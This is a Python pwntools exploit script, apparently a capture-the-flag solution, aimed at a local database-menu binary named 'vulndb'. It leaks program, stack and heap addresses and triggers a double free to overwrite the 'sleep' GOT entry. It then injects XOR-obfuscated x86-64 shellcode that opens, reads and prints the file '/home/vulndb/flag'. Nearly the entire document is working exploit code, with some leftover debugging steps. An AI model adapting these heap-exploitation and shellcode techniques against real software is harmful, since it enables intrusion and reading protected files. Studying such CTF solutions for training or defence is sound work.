#! /usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendafter('Table name:', tb_name)
    r.sendafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name, data=''):
    r.sendlineafter('>>', 'Insert')
    r.sendafter('name:', tb_name)
    query = r.recvuntil(':', timeout=1).decode()
    if(query[1] == '[' and query[-1] == ':'):
        print(query)
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendafter(':', str(data))

def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())

r = process('./vulndb_patched3_NX', env={"LD_LIBRARY_PATH":"."})
r.sendafter('>>', 'a'*0x7+'x')
r.recvuntil('x')
pie_base = u64(r.recvline().strip()+b'\x00'*2) - 0x1360
print("pie_base @ ", hex(pie_base))

r.sendafter('>>', 'a'*0xf+'x')
r.recvuntil('x')
stack = u64(r.recvline().strip()+b'\x00'*2)
print("stack @ ", hex(stack))

# leak heap
create_db('db0')
create_db('db1')
delete_db(0)
delete_db(1)
select_db(1)
r.recvuntil(b'[db:')
heap_base = u64(r.recvuntil(b']', drop=True).ljust(8, b'\0')) - 0x2a0
log.info('heap: {:#x}'.format(heap_base))

create_db('db2')
create_db('db3')
create_db('db4')

select_db(2)
create_table('/home/vulndb/flag', 'c'*0xf, 1)
for i in range(8):
    insert('/home/vulndb/flag', '123')

for i in range(8):
    delete('/home/vulndb/flag', 0)

# double free to fasbin
delete_db(3)
delete_db(4)
r.interactive()
delete_db(3)

select_db(3)
create_table('a\n', 'b\n', 3)
for i in range(3):
    insert('a\n', 'c\n')

sleep_got = pie_base + 0x60d8
insert('a\n', p64(sleep_got))

#create_db(heap_base)

flagstr = heap_base + 768
xor_pat = 0x5a5a5a5a5a5a5a5a
xor_flagstr = xor_pat ^ flagstr
shellcode = asm('''
    mov rdi, ''' + str(xor_flagstr) + '''
    mov rsi, ''' + str(xor_pat) + '''
    xor rdi, rsi
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    xor al, 2
    syscall
    mov r9, rax
    mov rdi, rax
    mov rsi, ''' + str(xor_flagstr) + '''
    mov rdx, ''' + str(xor_pat) + '''
    xor rsi, rdx
    mov rdx, ''' + str(400 ^ xor_pat) + '''
    mov r8, ''' + str(xor_pat) + '''
    xor rdx, r8
    xor rax, rax
    syscall
    xor rdi, rdi
    inc rdi
    mov rsi, ''' + str(xor_flagstr) + '''
    mov rdx, ''' + str(xor_pat) + '''
    xor rsi, rdx
    mov rdx, ''' + str(400 ^ xor_pat) + '''
    mov r8, ''' + str(xor_pat) + '''
    xor rdx, r8
    xor rax, rax
    inc rax
    syscall
''')
payload = shellcode + b'/home/vulndb/flag'

insert('a\n', payload.ljust(0x100, b'a'))
target = heap_base + 0xae0
create_db(p64(target))
create_db(p64(target))

#gdb.attach(r)
raw_input('>')
select_db(6)

r.interactive()
